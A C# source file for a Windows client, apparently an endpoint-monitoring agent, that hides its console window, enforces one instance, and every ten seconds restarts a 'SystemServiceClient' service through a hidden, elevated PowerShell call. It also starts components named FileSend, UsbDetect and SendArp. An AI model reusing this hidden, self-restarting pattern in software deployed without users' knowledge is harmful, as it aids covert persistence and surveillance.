using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.ComponentModel;
using System.Management;
using CSVHost.Model;

namespace CSVHost
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static Timer t;

        public static int nTimeCount = 0;
        private static Mutex _mutex;
        private static bool _createdNew;
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
            _mutex = new Mutex(true, "CRMHost", out _createdNew);
            if (!_createdNew)  // already runnig
            {
                Environment.Exit(0);
            }

            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);
            
            t = new Timer(TimerCallback, null, 0, 10000);
            AutoPatch patch = new AutoPatch();
            ZeroPatch zeroPatch = new ZeroPatch();
            UsbDetect usbDetect = new UsbDetect();
            FileSend fileSend = new FileSend();

            SendArp arp = new SendArp();
            Console.ReadLine();
        }

        

        

        private static void RunProcess()
        {
            Process process = new Process();
            try
            {
                process.StartInfo.FileName = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\ClientSetup.exe";
                process.StartInfo.UseShellExecute = true;
                process.Start();
                process.WaitForExit();
            }
            catch (Exception ex)
            {
                //File.AppendAllText("csvhostlog.txt", ex.Message);
            }
        }

        

        private static void TimerCallback(Object o)
        {
            try
            {
                ServiceController sc = new ServiceController("SystemServiceClient");
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        break;
                    case ServiceControllerStatus.Stopped:
                        try
                        {
                            var process = new System.Diagnostics.Process();
                            var startInfo = new System.Diagnostics.ProcessStartInfo();
                            startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                            startInfo.UseShellExecute = true;
                            startInfo.CreateNoWindow = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.FileName = "cmd.exe";

                            string command = $"/c PowerShell Start-Service -Name \"SystemServiceClient\"";
                            startInfo.Arguments = command;
                            startInfo.Verb = "runas";
                            process.StartInfo = startInfo;
                            process.Start();

                            // process.WaitForExit();
                        }
                        catch(Exception ex)
                        {
                        }
                        break;
                    case ServiceControllerStatus.Paused:
                        break;
                    case ServiceControllerStatus.StopPending:
                        break;
                    case ServiceControllerStatus.StartPending:
                        break;
                    default:
                        break;
                }
            }
            catch
            {

            }
            //nTimeCount++;
            //if (nTimeCount == 43320)
            //{
            //    nTimeCount = 0;
            //    Process.Start(FileName);
            //    Environment.Exit(0);
            //}
            //var processes = FindProcess("CRMAuto");
            //if (processes.Length == 0)
            //{
            //    try
            //    {
            //        var proc = new Process();
            //        proc.StartInfo.FileName = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMAuto.exe";
            //        proc.StartInfo.UseShellExecute = true;
            //        proc.Start();
            //    }
            //    catch
            //    {
            //        //File.WriteAllText("D:\\log.txt", ex.Message);
            //    }

            //}
            //else if (processes.Length > 1)
            //{
            //    try
            //    {
            //        processes[0].Kill();
            //    }
            //    catch
            //    {

            //    }

            //}
            //processes = FindProcess("Monitor.TaskView");
            //if (processes.Length == 0)
            //{
            //    try
            //    {
            //        var proc = new Process();
            //        proc.StartInfo.FileName = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Client\\Monitor.TaskView.exe";
            //        proc.StartInfo.UseShellExecute = true;
            //        proc.Start();
            //    }
            //    catch
            //    {

            //    }

                

            //}
            //else if (processes.Length > 1)
            //{
            //    try
            //    {
            //        processes[0].Kill();
            //    }
            //    catch
            //    {

            //    }

            //}
            GC.Collect();
        }

        public static Process[] FindProcess(string processName)
        {
            Process[] processList = Process.GetProcessesByName(processName);

            return processList;
        }
        public static string FileName
        {
            get { return Process.GetCurrentProcess().MainModule.FileName; }
        }

        private static void OnProcessExit(object sender, EventArgs eventArgs)
        {
            if (_mutex != null && _createdNew)
            {
                try
                {
                    _mutex.ReleaseMutex();
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }
    }

    
}
